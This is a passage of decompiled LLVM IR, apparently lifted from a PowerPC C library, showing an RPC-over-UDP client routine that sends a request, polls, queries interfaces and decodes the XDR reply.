  store i32 %v1_1000fb7c, i32* %v1_1000fb78, align 4
  %v0_1000fb84 = load i32, i32* @r26, align 4
  %v1_1000fb84 = add i32 %v0_1000fb84, 4
  %v2_1000fb84 = inttoptr i32 %v1_1000fb84 to i32*
  %v3_1000fb84 = load i32, i32* %v2_1000fb84, align 4
  store i32 %v3_1000fb84, i32* %r9.global-to-local, align 4
  %v1_1000fb88 = add i32 %v3_1000fb84, 4
  %v2_1000fb88 = inttoptr i32 %v1_1000fb88 to i32*
  %v3_1000fb88 = load i32, i32* %v2_1000fb88, align 4
  store i32 %v3_1000fb88, i32* %r9.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_1000fb88)
  %v0_1000fb94 = load i32, i32* %r3.global-to-local, align 4
  %v3_1000fb94 = icmp eq i32 %v0_1000fb94, 0
  br i1 %v3_1000fb94, label %dec_label_pc_1000fbd8, label %dec_label_pc_1000fb9c

dec_label_pc_1000fb9c:                            ; preds = %dec_label_pc_1000fb4c
  %v0_1000fb9c = load i32, i32* %r23.global-to-local, align 4
  %v1_1000fb9c = inttoptr i32 %v0_1000fb9c to i32*
  %v2_1000fb9c = load i32, i32* %v1_1000fb9c, align 4
  store i32 %v2_1000fb9c, i32* %r3.global-to-local, align 4
  %v1_1000fba4 = add i32 %v2_1000fb9c, 32
  %v2_1000fba4 = inttoptr i32 %v1_1000fba4 to i32*
  %v3_1000fba4 = load i32, i32* %v2_1000fba4, align 4
  store i32 %v3_1000fba4, i32* %r9.global-to-local, align 4
  %v1_1000fba8 = add i32 %v3_1000fba4, 4
  %v2_1000fba8 = inttoptr i32 %v1_1000fba8 to i32*
  %v3_1000fba8 = load i32, i32* %v2_1000fba8, align 4
  store i32 %v3_1000fba8, i32* %r9.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_1000fba8)
  %v0_1000fbb4 = load i32, i32* %r3.global-to-local, align 4
  %v3_1000fbb4 = icmp eq i32 %v0_1000fbb4, 0
  br i1 %v3_1000fbb4, label %dec_label_pc_1000fbd8, label %dec_label_pc_1000fbbc

dec_label_pc_1000fbbc:                            ; preds = %dec_label_pc_1000fb9c
  %v0_1000fbbc = load i32, i32* @r26, align 4
  store i32 %v0_1000fbbc, i32* %r3.global-to-local, align 4
  %v0_1000fbc4 = load i32, i32* %r20.global-to-local, align 4
  call void @__pseudo_call(i32 %v0_1000fbc4)
  %v0_1000fbd0 = load i32, i32* %r3.global-to-local, align 4
  %v3_1000fbd0 = icmp eq i32 %v0_1000fbd0, 0
  br i1 %v3_1000fbd0, label %dec_label_pc_1000fbd8, label %dec_label_pc_1000fbe4

dec_label_pc_1000fbd8:                            ; preds = %dec_label_pc_1000fbbc, %dec_label_pc_1000fb9c, %dec_label_pc_1000fb4c
  store i32 1, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000fd88

dec_label_pc_1000fbe4:                            ; preds = %dec_label_pc_1000fbbc
  %v0_1000fbe4 = load i32, i32* @r26, align 4
  %v1_1000fbe4 = add i32 %v0_1000fbe4, 4
  %v2_1000fbe4 = inttoptr i32 %v1_1000fbe4 to i32*
  %v3_1000fbe4 = load i32, i32* %v2_1000fbe4, align 4
  store i32 %v3_1000fbe4, i32* %r9.global-to-local, align 4
  store i32 %v0_1000fbe4, i32* %r3.global-to-local, align 4
  %v1_1000fbec = add i32 %v3_1000fbe4, 16
  %v2_1000fbec = inttoptr i32 %v1_1000fbec to i32*
  %v3_1000fbec = load i32, i32* %v2_1000fbec, align 4
  store i32 %v3_1000fbec, i32* %r9.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_1000fbec)
  %v0_1000fbf8 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_1000fbf8, i32* %r19.global-to-local, align 4
  %v0_1000fbfc.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_1000fbfc

dec_label_pc_1000fbfc:                            ; preds = %dec_label_pc_1000fd78, %dec_label_pc_1000fd6c, %dec_label_pc_1000fbe4
  %v0_1000fc0c = phi i32 [ %v0_1000fd24, %dec_label_pc_1000fd78 ], [ %v0_1000fd24, %dec_label_pc_1000fd6c ], [ %v0_1000fbfc.pre, %dec_label_pc_1000fbe4 ]
  %v1_1000fbfc = inttoptr i32 %v0_1000fc0c to i32*
  %v2_1000fbfc = load i32, i32* %v1_1000fbfc, align 4
  store i32 %v2_1000fbfc, i32* %r3.global-to-local, align 4
  %v0_1000fc00 = load i32, i32* %r19.global-to-local, align 4
  %v1_1000fc04 = add i32 %v0_1000fc0c, 88
  %v2_1000fc04 = inttoptr i32 %v1_1000fc04 to i32*
  %v3_1000fc04 = load i32, i32* %v2_1000fc04, align 4
  %v1_1000fc0c = add i32 %v0_1000fc0c, 24
  %v2_1000fc0c = inttoptr i32 %v1_1000fc0c to i32*
  %v3_1000fc0c = load i32, i32* %v2_1000fc0c, align 4
  %v1_1000fc10 = add i32 %v0_1000fc0c, 8
  store i32 268499992, i32* @lr, align 4
  %v6_1000fc14 = call i32 @__libc_sendto(i32 %v2_1000fbfc, i32 %v3_1000fc04, i32 %v0_1000fc00, i32 0, i32 %v1_1000fc10, i32 %v3_1000fc0c)
  store i32 %v6_1000fc14, i32* %r3.global-to-local, align 4
  %v1_1000fc18 = load i32, i32* %r19.global-to-local, align 4
  %v4_1000fc18 = icmp eq i32 %v6_1000fc14, %v1_1000fc18
  br i1 %v4_1000fc18, label %dec_label_pc_1000fc20, label %dec_label_pc_1000fafc

dec_label_pc_1000fc20:                            ; preds = %dec_label_pc_1000fbfc
  %v0_1000fc20 = load i32, i32* %r21.global-to-local, align 4
  %v3_1000fc20 = icmp eq i32 %v0_1000fc20, 0
  br i1 %v3_1000fc20, label %dec_label_pc_1000fc28, label %dec_label_pc_1000fc30

dec_label_pc_1000fc28:                            ; preds = %dec_label_pc_1000fc20
  %v0_1000fc28 = load i32, i32* %r22.global-to-local, align 4
  %v3_1000fc28 = icmp eq i32 %v0_1000fc28, 0
  br i1 %v3_1000fc28, label %dec_label_pc_1000fd80, label %dec_label_pc_1000fc30

dec_label_pc_1000fc30:                            ; preds = %dec_label_pc_1000fc20, %dec_label_pc_1000fc28, %dec_label_pc_1000fb40
  store i32 ptrtoint (i32* @global_var_10030d10.393 to i32), i32* %r9.global-to-local, align 4
  %v0_1000fc54 = load i32, i32* @r30, align 4
  %v1_1000fc54 = inttoptr i32 %v0_1000fc54 to i32*
  %v2_1000fc54 = load i32, i32* %v1_1000fc54, align 4
  store i32 %v2_1000fc54, i32* %r9.global-to-local, align 4
  store i32 %v2_1000fc54, i32* %stack_var_-9060, align 4
  br label %dec_label_pc_1000fc60

dec_label_pc_1000fc60:                            ; preds = %dec_label_pc_1000fd90, %dec_label_pc_1000ff44, %dec_label_pc_1000ff34, %dec_label_pc_1000ff2c, %dec_label_pc_1000fc30
  store i32 %v2_1000fc60, i32* %r3.global-to-local, align 4
  %v0_1000fc68 = load i32, i32* %r16.global-to-local, align 4
  store i32 268500080, i32* @lr, align 4
  %v3_1000fc6c = call i32 @__libc_poll(i32 %v2_1000fc60, i32 1, i32 %v0_1000fc68)
  store i32 %v3_1000fc6c, i32* %r3.global-to-local, align 4
  %v3_1000fc70 = icmp eq i32 %v3_1000fc6c, -1
  br i1 %v3_1000fc70, label %dec_label_pc_1000fd90, label %dec_label_pc_1000fc78

dec_label_pc_1000fc78:                            ; preds = %dec_label_pc_1000fc60
  %v3_1000fc78 = icmp eq i32 %v3_1000fc6c, 0
  br i1 %v3_1000fc78, label %dec_label_pc_1000fc80, label %dec_label_pc_1000fda0

dec_label_pc_1000fc80:                            ; preds = %dec_label_pc_1000fc78
  %v0_1000fc80 = load i32, i32* @r30, align 4
  %v1_1000fc80 = inttoptr i32 %v0_1000fc80 to i32*
  %v2_1000fc80 = load i32, i32* %v1_1000fc80, align 4
  store i32 %v2_1000fc80, i32* %r25.global-to-local, align 4
  store i32 8800, i32* %stack_var_-9044, align 4
  store i32 %v2_1000fc80, i32* %r3.global-to-local, align 4
  store i32 268500140, i32* @lr, align 4
  %v3_1000fca8 = call i32 @ioctl(i32 %v2_1000fc80, i32 35090, i32 %v2_1000fc9c)
  store i32 %v3_1000fca8, i32* %r3.global-to-local, align 4
  %v3_1000fcac = icmp eq i32 %v3_1000fca8, 0
  br i1 %v3_1000fcac, label %dec_label_pc_1000fcb4, label %dec_label_pc_1000fd18

dec_label_pc_1000fcb4:                            ; preds = %dec_label_pc_1000fc80
  %v3_1000fcb4 = load i32, i32* %stack_var_-9044, align 4
  store i32 %v2_1000fdc0, i32* @r29, align 4
  %v1_1000fcbc = udiv i32 %v3_1000fcb4, 32
  %tmp84 = icmp ugt i32 %v3_1000fcb4, 31
  %v0_1000fd0c79 = load i32, i32* %r25.global-to-local, align 4
  store i32 %v0_1000fd0c79, i32* %r3.global-to-local, align 4
  %v1_1000fd1080 = add nsw i32 %v1_1000fcbc, -1
  store i32 %v1_1000fd1080, i32* @r28, align 4
  br i1 %tmp84, label %dec_label_pc_1000fcc4, label %dec_label_pc_1000fd18

dec_label_pc_1000fcc4:                            ; preds = %dec_label_pc_1000fcb4, %dec_label_pc_1000fcf8
  %v0_1000fd0c81 = phi i32 [ %v0_1000fd0c, %dec_label_pc_1000fcf8 ], [ %v0_1000fd0c79, %dec_label_pc_1000fcb4 ]
  store i32 268500184, i32* @lr, align 4
  %v3_1000fcd4 = call i32 @ioctl(i32 %v0_1000fd0c81, i32 35091, i32 %v2_1000fd04)
  store i32 %v3_1000fcd4, i32* %r3.global-to-local, align 4
  %v1_1000fcd8 = icmp slt i32 %v3_1000fcd4, 0
  br i1 %v1_1000fcd8, label %dec_label_pc_1000fd18, label %dec_label_pc_1000fce0

dec_label_pc_1000fce0:                            ; preds = %dec_label_pc_1000fcc4
  store i32 %v1_1000fce4, i32* %r9.global-to-local, align 4
  %v0_1000fcf8.pre = load i32, i32* @r29, align 4
  br i1 %v3_1000fce4, label %dec_label_pc_1000fcf8, label %dec_label_pc_1000fcec

dec_label_pc_1000fcec:                            ; preds = %dec_label_pc_1000fce0
  %v1_1000fcec = add i32 %v0_1000fcf8.pre, 16
  %v2_1000fcec = inttoptr i32 %v1_1000fcec to i16*
  %v3_1000fcec = load i16, i16* %v2_1000fcec, align 2
  %v3_1000fcf0 = icmp eq i16 %v3_1000fcec, 2
  br i1 %v3_1000fcf0, label %dec_label_pc_1000fd24, label %dec_label_pc_1000fcf8

dec_label_pc_1000fcf8:                            ; preds = %dec_label_pc_1000fce0, %dec_label_pc_1000fcec
  %v1_1000fcf8 = add i32 %v0_1000fcf8.pre, 32
  store i32 %v1_1000fcf8, i32* @r29, align 4
  %v0_1000fcfc.pre = load i32, i32* @r28, align 4
  %v2_1000fcfc = icmp sgt i32 %v0_1000fcfc.pre, 0
  %v0_1000fd0c = load i32, i32* %r25.global-to-local, align 4
  store i32 %v0_1000fd0c, i32* %r3.global-to-local, align 4
  %v1_1000fd10 = add i32 %v0_1000fcfc.pre, -1
  store i32 %v1_1000fd10, i32* @r28, align 4
  br i1 %v2_1000fcfc, label %dec_label_pc_1000fcc4, label %dec_label_pc_1000fd18

dec_label_pc_1000fd18:                            ; preds = %dec_label_pc_1000fc80, %dec_label_pc_1000fcb4, %dec_label_pc_1000fcf8, %dec_label_pc_1000fcc4
  store i32 4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000fd88

dec_label_pc_1000fd24:                            ; preds = %dec_label_pc_1000fcec
  %v0_1000fd24 = load i32, i32* @r30, align 4
  %v1_1000fd24 = add i32 %v0_1000fd24, 32
  %v2_1000fd24 = inttoptr i32 %v1_1000fd24 to i32*
  %v3_1000fd24 = load i32, i32* %v2_1000fd24, align 4
  store i32 1000000, i32* %r9.global-to-local, align 4
  %v0_1000fd30 = load i32, i32* %r24.global-to-local, align 4
  %v2_1000fd30 = add i32 %v0_1000fd30, %v3_1000fd24
  store i32 %v2_1000fd30, i32* %r24.global-to-local, align 4
  %v1_1000fd34 = add i32 %v0_1000fd24, 28
  %v2_1000fd34 = inttoptr i32 %v1_1000fd34 to i32*
  %v3_1000fd34 = load i32, i32* %v2_1000fd34, align 4
  %v2_1000fd38 = udiv i32 %v2_1000fd30, 1000000
  %v0_1000fd40 = load i32, i32* %r18.global-to-local, align 4
  %v2_1000fd40 = add i32 %v0_1000fd40, %v3_1000fd34
  store i32 %v2_1000fd40, i32* %r18.global-to-local, align 4
  %v1_1000fd44 = add nuw nsw i32 %v2_1000fd38, 1
  store i32 %v1_1000fd44, i32* %r9.global-to-local, align 4
  %tmp65 = icmp sgt i32 %v2_1000fd30, -1
  br i1 %tmp65, label %dec_label_pc_1000fd64.preheader, label %dec_label_pc_1000fd64.preheader.thread

dec_label_pc_1000fd64.preheader.thread:           ; preds = %dec_label_pc_1000fd24
  %v1_1000fd641230 = add i32 %v2_1000fd30, -983040
  store i32 %v1_1000fd641230, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000fd6c

dec_label_pc_1000fd64.preheader:                  ; preds = %dec_label_pc_1000fd24
  %v1_1000fd6412 = add i32 %v2_1000fd30, -983040
  store i32 %v1_1000fd6412, i32* %r9.global-to-local, align 4
  %tmp66 = icmp ult i32 %v2_1000fd30, 1000000
  br i1 %tmp66, label %dec_label_pc_1000fd6c, label %dec_label_pc_1000fd5c.lr.ph

dec_label_pc_1000fd5c.lr.ph:                      ; preds = %dec_label_pc_1000fd64.preheader
  %tmp67 = mul i32 %v2_1000fd38, 1000000
  %tmp68 = add i32 %v2_1000fd40, %v2_1000fd38
  %tmp71 = sub i32 %v1_1000fd6412, %tmp67
  %v1_1000fd60 = sub i32 %v2_1000fd30, %tmp67
  store i32 %tmp68, i32* %r18.global-to-local, align 4
  store i32 %tmp71, i32* %r9.global-to-local, align 4
  store i32 %v1_1000fd60, i32* %r24.global-to-local, align 4
  br label %dec_label_pc_1000fd6c

dec_label_pc_1000fd6c:                            ; preds = %dec_label_pc_1000fd64.preheader.thread, %dec_label_pc_1000fd5c.lr.ph, %dec_label_pc_1000fd64.preheader
  %v0_1000fd78 = phi i32 [ %v1_1000fd60, %dec_label_pc_1000fd5c.lr.ph ], [ %v2_1000fd30, %dec_label_pc_1000fd64.preheader ], [ %v2_1000fd30, %dec_label_pc_1000fd64.preheader.thread ]
  %v0_1000fd6c.lcssa = phi i32 [ %tmp68, %dec_label_pc_1000fd5c.lr.ph ], [ %v2_1000fd40, %dec_label_pc_1000fd64.preheader ], [ %v2_1000fd40, %dec_label_pc_1000fd64.preheader.thread ]
  %v1_1000fd6c = load i32, i32* %r21.global-to-local, align 4
  %v2_1000fd6c = icmp slt i32 %v0_1000fd6c.lcssa, %v1_1000fd6c
  br i1 %v2_1000fd6c, label %dec_label_pc_1000fbfc, label %dec_label_pc_1000fd74

dec_label_pc_1000fd74:                            ; preds = %dec_label_pc_1000fd6c
  %v4_1000fd6c = icmp eq i32 %v0_1000fd6c.lcssa, %v1_1000fd6c
  br i1 %v4_1000fd6c, label %dec_label_pc_1000fd78, label %dec_label_pc_1000fd80

dec_label_pc_1000fd78:                            ; preds = %dec_label_pc_1000fd74
  %v1_1000fd78 = load i32, i32* %r22.global-to-local, align 4
  %v2_1000fd78 = icmp slt i32 %v0_1000fd78, %v1_1000fd78
  br i1 %v2_1000fd78, label %dec_label_pc_1000fbfc, label %dec_label_pc_1000fd80

dec_label_pc_1000fd80:                            ; preds = %dec_label_pc_1000fd74, %dec_label_pc_1000fd78, %dec_label_pc_1000fc28
  store i32 5, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000fd88

dec_label_pc_1000fd88:                            ; preds = %dec_label_pc_1000fd18, %dec_label_pc_1000fbd8, %dec_label_pc_1000fd80
  %v0_1000fd88 = phi i32 [ 4, %dec_label_pc_1000fd18 ], [ 1, %dec_label_pc_1000fbd8 ], [ 5, %dec_label_pc_1000fd80 ]
  %v1_1000fd88 = load i32, i32* @r30, align 4
  %v2_1000fd88 = add i32 %v1_1000fd88, 44
  %v3_1000fd88 = inttoptr i32 %v2_1000fd88 to i32*
  store i32 %v0_1000fd88, i32* %v3_1000fd88, align 4
  br label %dec_label_pc_10010030

dec_label_pc_1000fd90:                            ; preds = %dec_label_pc_1000fc60
  %v0_1000fd90 = call i32 @__errno_location()
  store i32 %v0_1000fd90, i32* %r3.global-to-local, align 4
  %v1_1000fd94 = inttoptr i32 %v0_1000fd90 to i32*
  %v2_1000fd94 = load i32, i32* %v1_1000fd94, align 4
  store i32 %v2_1000fd94, i32* %r9.global-to-local, align 4
  %v3_1000fd98 = icmp eq i32 %v2_1000fd94, 4
  br i1 %v3_1000fd98, label %dec_label_pc_1000fc60, label %dec_label_pc_1000fb14

dec_label_pc_1000fda0:                            ; preds = %dec_label_pc_1000fc78
  store i32 %v1_1000fda4, i32* %r9.global-to-local, align 4
  br i1 %v3_1000fda4, label %dec_label_pc_1000fee0, label %dec_label_pc_1000fdac

dec_label_pc_1000fdac:                            ; preds = %dec_label_pc_1000fda0
  %v0_1000fdac = load i32, i32* %r19.global-to-local, align 4
  %v1_1000fdac = add i32 %v0_1000fdac, 286
  %v2_1000fdb0 = load i32, i32* %stack_var_-9072, align 4
  store i32 %v2_1000fdb0, i32* %r9.global-to-local, align 4
  %v1_1000fdb4 = call i32 @__asm_rlwinm(i32 %v1_1000fdac, i32 0, i32 0, i32 27)
  %v0_1000fdc4 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000fdc4 = load i32, i32* @r1, align 4
  %v3_1000fdc4 = sub i32 %v1_1000fdc4, %v1_1000fdb4
  %v4_1000fdc4 = inttoptr i32 %v3_1000fdc4 to i32*
  store i32 %v0_1000fdc4, i32* %v4_1000fdc4, align 4
  store i32 %v2_1000fdc8, i32* %stack_var_-8900, align 4
  %v1_1000fde0 = add i32 %v3_1000fdc4, 23
  store i32 %v1_1000fde0, i32* %r9.global-to-local, align 4
  %v1_1000fde8 = call i32 @__asm_rlwinm(i32 %v1_1000fde0, i32 0, i32 0, i32 27)
  store i32 %v1_1000fde8, i32* %r9.global-to-local, align 4
  %v1_1000fdf8 = add i32 %v1_1000fde8, 256
  store i32 %v1_1000fdf8, i32* %r28.global-to-local, align 4
  %v0_1000fe10 = load i32, i32* @r30, align 4
  %v1_1000fe10 = inttoptr i32 %v0_1000fe10 to i32*
  %v2_1000fe10 = load i32, i32* %v1_1000fe10, align 4
  store i32 %v2_1000fe10, i32* %r3.global-to-local, align 4
  store i32 268500504, i32* @lr, align 4
  %v3_1000fe14 = call i32 @__libc_recvmsg(i32 %v2_1000fe10, i32 8192, i32 8192)
  store i32 %v3_1000fe14, i32* %r3.global-to-local, align 4
  %v1_1000fe18 = icmp slt i32 %v3_1000fe14, 0
  br i1 %v1_1000fe18, label %dec_label_pc_1000fee0, label %dec_label_pc_1000fe20

dec_label_pc_1000fe20:                            ; preds = %dec_label_pc_1000fdac
  %v0_1000fe20 = load i32, i32* @r30, align 4
  %v1_1000fe20 = add i32 %v0_1000fe20, 88
  %v2_1000fe20 = inttoptr i32 %v1_1000fe20 to i32*
  %v3_1000fe20 = load i32, i32* %v2_1000fe20, align 4
  store i32 %v3_1000fe20, i32* @r4, align 4
  %v0_1000fe24 = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_1000fe24, i32* @r3, align 4
  %v3_1000fe2c = call i32 @bcmp(i32 %v0_1000fe24, i32 %v3_1000fe20, i32 %v3_1000fe14)
  store i32 %v3_1000fe2c, i32* %r3.global-to-local, align 4
  %v3_1000fe30 = icmp eq i32 %v3_1000fe2c, 0
  br i1 %v3_1000fe30, label %dec_label_pc_1000fe38, label %dec_label_pc_1000fee0

dec_label_pc_1000fe38:                            ; preds = %dec_label_pc_1000fe20
  store i32 0, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000fee0

dec_label_pc_1000fee0:                            ; preds = %dec_label_pc_1000fe38, %dec_label_pc_1000fe20, %dec_label_pc_1000fdac, %dec_label_pc_1000fda0, %dec_label_pc_1000ff10
  %v0_1000fee4 = load i32, i32* @r30, align 4
  %v1_1000fee4 = add i32 %v0_1000fee4, 96
  store i32 %v1_1000fee4, i32* %r28.global-to-local, align 4
  store i32 16, i32* %stack_var_-9064, align 4
  %v1_1000fef8 = add i32 %v0_1000fee4, 92
  %v2_1000fef8 = inttoptr i32 %v1_1000fef8 to i32*
  %v3_1000fef8 = load i32, i32* %v2_1000fef8, align 4
  %v1_1000ff00 = inttoptr i32 %v0_1000fee4 to i32*
  %v2_1000ff00 = load i32, i32* %v1_1000ff00, align 4
  store i32 %v2_1000ff00, i32* %r3.global-to-local, align 4
  store i32 268500744, i32* @lr, align 4
  %v6_1000ff04 = call i32 @__libc_recvfrom(i32 %v2_1000ff00, i32 %v1_1000fee4, i32 %v3_1000fef8, i32 0, i32 %v2_1000fef4, i32 %v2_1000fefc)
  store i32 %v6_1000ff04, i32* %r3.global-to-local, align 4
  %tmp72 = icmp sgt i32 %v6_1000ff04, -1
  br i1 %tmp72, label %dec_label_pc_1000ff34, label %dec_label_pc_1000ff10

dec_label_pc_1000ff10:                            ; preds = %dec_label_pc_1000fee0
  %v0_1000ff10 = call i32 @__errno_location()
  store i32 %v0_1000ff10, i32* %r3.global-to-local, align 4
  %v1_1000ff14 = inttoptr i32 %v0_1000ff10 to i32*
  %v2_1000ff14 = load i32, i32* %v1_1000ff14, align 4
  %v3_1000ff18 = icmp eq i32 %v2_1000ff14, 4
  br i1 %v3_1000ff18, label %dec_label_pc_1000fee0, label %dec_label_pc_1000ff2c

dec_label_pc_1000ff2c:                            ; preds = %dec_label_pc_1000ff10
  %v0_1000ff20 = call i32 @__errno_location()
  store i32 %v0_1000ff20, i32* %r3.global-to-local, align 4
  %v1_1000ff24 = inttoptr i32 %v0_1000ff20 to i32*
  %v2_1000ff24 = load i32, i32* %v1_1000ff24, align 4
  store i32 %v2_1000ff24, i32* %r9.global-to-local, align 4
  %v3_1000ff28 = icmp eq i32 %v2_1000ff24, 11
  br i1 %v3_1000ff28, label %dec_label_pc_1000fc60, label %dec_label_pc_1000fb14

dec_label_pc_1000ff34:                            ; preds = %dec_label_pc_1000fee0
  %tmp73 = icmp slt i32 %v6_1000ff04, 4
  br i1 %tmp73, label %dec_label_pc_1000fc60, label %dec_label_pc_1000ff3c

dec_label_pc_1000ff3c:                            ; preds = %dec_label_pc_1000ff34
  %v0_1000ff3c = load i32, i32* %r20.global-to-local, align 4
  %v3_1000ff3c = icmp eq i32 %v0_1000ff3c, 0
  br i1 %v3_1000ff3c, label %dec_label_pc_1000ff58, label %dec_label_pc_1000ff44

dec_label_pc_1000ff44:                            ; preds = %dec_label_pc_1000ff3c
  %v0_1000ff44 = load i32, i32* @r30, align 4
  %v1_1000ff44 = add i32 %v0_1000ff44, 88
  %v2_1000ff44 = inttoptr i32 %v1_1000ff44 to i32*
  %v3_1000ff44 = load i32, i32* %v2_1000ff44, align 4
  store i32 %v3_1000ff44, i32* %r9.global-to-local, align 4
  %v1_1000ff48 = add i32 %v0_1000ff44, 96
  %v2_1000ff48 = inttoptr i32 %v1_1000ff48 to i32*
  %v3_1000ff48 = load i32, i32* %v2_1000ff48, align 4
  %v1_1000ff4c = inttoptr i32 %v3_1000ff44 to i32*
  %v2_1000ff4c = load i32, i32* %v1_1000ff4c, align 4
  %v4_1000ff50 = icmp eq i32 %v3_1000ff48, %v2_1000ff4c
  br i1 %v4_1000ff50, label %dec_label_pc_1000ff58, label %dec_label_pc_1000fc60

dec_label_pc_1000ff58:                            ; preds = %dec_label_pc_1000ff44, %dec_label_pc_1000ff3c
  %v0_1000ff5c = load i32, i32* %r28.global-to-local, align 4
  store i32 %v2_1000ff58, i32* %r3.global-to-local, align 4
  store i32 %v2_1000ff6c, i32* %r28.global-to-local, align 4
  %v5_1000ff70 = call i32 @__GI_xdrmem_create(i32* nonnull %stack_var_-9004, i32 %v0_1000ff5c, i32 %v6_1000ff04, i32 1)
  store i32 %v2_1000ff58, i32* %r3.global-to-local, align 4
  store i32 268500864, i32* @lr, align 4
  %v2_1000ff7c = call i32 @__GI_xdr_replymsg(i32 %v2_1000ff58, i32 %v2_1000ff6c)
  store i32 %v2_1000ff7c, i32* %r3.global-to-local, align 4
  %v3_1000ff80 = icmp eq i32 %v2_1000ff7c, 0
  br i1 %v3_1000ff80, label %dec_label_pc_10010024, label %dec_label_pc_1000ff88

dec_label_pc_1000ff88:                            ; preds = %dec_label_pc_1000ff58
  store i32 %v2_1000ff6c, i32* %r3.global-to-local, align 4
  %v0_1000ff8c = load i32, i32* @r30, align 4
  %v1_1000ff8c = add i32 %v0_1000ff8c, 44
  store i32 268500884, i32* @lr, align 4
  %v2_1000ff90 = inttoptr i32 %v1_1000ff8c to i32*
  %v3_1000ff90 = call i32 @__GI__seterr_reply(i32 %v2_1000ff6c, i32* %v2_1000ff90)
  store i32 %v3_1000ff90, i32* %r3.global-to-local, align 4
  %v0_1000ff94 = load i32, i32* @r30, align 4
  %v1_1000ff94 = add i32 %v0_1000ff94, 44
  %v2_1000ff94 = inttoptr i32 %v1_1000ff94 to i32*
  %v3_1000ff94 = load i32, i32* %v2_1000ff94, align 4
  %v3_1000ff98 = icmp eq i32 %v3_1000ff94, 0
  br i1 %v3_1000ff98, label %dec_label_pc_1000ffa0, label %dec_label_pc_1000fff8

dec_label_pc_1000ffa0:                            ; preds = %dec_label_pc_1000ff88
  %v0_1000ffa0 = load i32, i32* %r23.global-to-local, align 4
  %v1_1000ffa0 = inttoptr i32 %v0_1000ffa0 to i32*
  %v2_1000ffa0 = load i32, i32* %v1_1000ffa0, align 4
  store i32 %v2_1000ffa0, i32* %r3.global-to-local, align 4
  %v1_1000ffac = add i32 %v2_1000ffa0, 32
  %v2_1000ffac = inttoptr i32 %v1_1000ffac to i32*
  %v3_1000ffac = load i32, i32* %v2_1000ffac, align 4
  store i32 %v3_1000ffac, i32* %r9.global-to-local, align 4
  %v1_1000ffb0 = add i32 %v3_1000ffac, 8
  %v2_1000ffb0 = inttoptr i32 %v1_1000ffb0 to i32*
  %v3_1000ffb0 = load i32, i32* %v2_1000ffb0, align 4
  store i32 %v3_1000ffb0, i32* %r9.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_1000ffb0)
  %v0_1000ffbc = load i32, i32* %r3.global-to-local, align 4
  %v3_1000ffbc = icmp eq i32 %v0_1000ffbc, 0
  br i1 %v3_1000ffbc, label %dec_label_pc_1000ffc4, label %dec_label_pc_1000ffd4

dec_label_pc_1000ffc4:                            ; preds = %dec_label_pc_1000ffa0
  %v1_1000ffc8 = load i32, i32* @r30, align 4
  %v2_1000ffc8 = add i32 %v1_1000ffc8, 44
  %v3_1000ffc8 = inttoptr i32 %v2_1000ffc8 to i32*
  store i32 7, i32* %v3_1000ffc8, align 4
  %v1_1000ffd0 = load i32, i32* @r30, align 4
  %v2_1000ffd0 = add i32 %v1_1000ffd0, 48
  %v3_1000ffd0 = inttoptr i32 %v2_1000ffd0 to i32*
  store i32 6, i32* %v3_1000ffd0, align 4
  br label %dec_label_pc_1000ffd4

dec_label_pc_1000ffd4:                            ; preds = %dec_label_pc_1000ffa0, %dec_label_pc_1000ffc4
  %v3_1000ffd8 = icmp eq i32 %tmp33, 0
  br i1 %v3_1000ffd8, label %dec_label_pc_1001002c, label %dec_label_pc_1000ffe0

dec_label_pc_1000ffe0:                            ; preds = %dec_label_pc_1000ffd4
  %v0_1000ffe4 = load i32, i32* @r26, align 4
  store i32 %v0_1000ffe4, i32* @r3, align 4
  %v2_1000ffe8 = inttoptr i32 %v0_1000ffe4 to i32*
  store i32 2, i32* %v2_1000ffe8, align 4
  store i32 %v2_1000fc34, i32* @r4, align 4
  store i32 ptrtoint (i32* @global_var_1000fff4.394 to i32), i32* @lr, align 4
  %v0_1000fff0 = call i32 @xdr_opaque_auth()
  store i32 %v0_1000fff0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1001002c

dec_label_pc_1000fff8:                            ; preds = %dec_label_pc_1000ff88
  %v0_1000fff8 = load i32, i32* %r17.global-to-local, align 4
  %tmp74 = icmp slt i32 %v0_1000fff8, 1
  br i1 %tmp74, label %dec_label_pc_1001002c, label %dec_label_pc_10010000

dec_label_pc_10010000:                            ; preds = %dec_label_pc_1000fff8
  %v0_10010000 = load i32, i32* %r23.global-to-local, align 4
  %v1_10010000 = inttoptr i32 %v0_10010000 to i32*
  %v2_10010000 = load i32, i32* %v1_10010000, align 4
  store i32 %v2_10010000, i32* %r3.global-to-local, align 4
  %v1_10010004 = add i32 %v2_10010000, 32
  %v2_10010004 = inttoptr i32 %v1_10010004 to i32*
  %v3_10010004 = load i32, i32* %v2_10010004, align 4
  store i32 %v3_10010004, i32* %r9.global-to-local, align 4
  %v1_10010008 = add i32 %v3_10010004, 12
  %v2_10010008 = inttoptr i32 %v1_10010008 to i32*
  %v3_10010008 = load i32, i32* %v2_10010008, align 4
  store i32 %v3_10010008, i32* %r9.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_10010008)
  %v0_10010014 = load i32, i32* %r3.global-to-local, align 4
  %v3_10010014 = icmp eq i32 %v0_10010014, 0
  br i1 %v3_10010014, label %dec_label_pc_1001002c, label %dec_label_pc_1001001c

dec_label_pc_1001001c:                            ; preds = %dec_label_pc_10010000
  %v0_1001001c = load i32, i32* %r17.global-to-local, align 4
  %v1_1001001c = add i32 %v0_1001001c, -1
  store i32 %v1_1001001c, i32* %r17.global-to-local, align 4
  %v0_1000fb40.pre = load i32, i32* %r20.global-to-local, align 4
  %v0_1000fb44.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_1000fb40

dec_label_pc_10010024:                            ; preds = %dec_label_pc_1000ff58
  %v1_10010028 = load i32, i32* @r30, align 4
  %v2_10010028 = add i32 %v1_10010028, 44
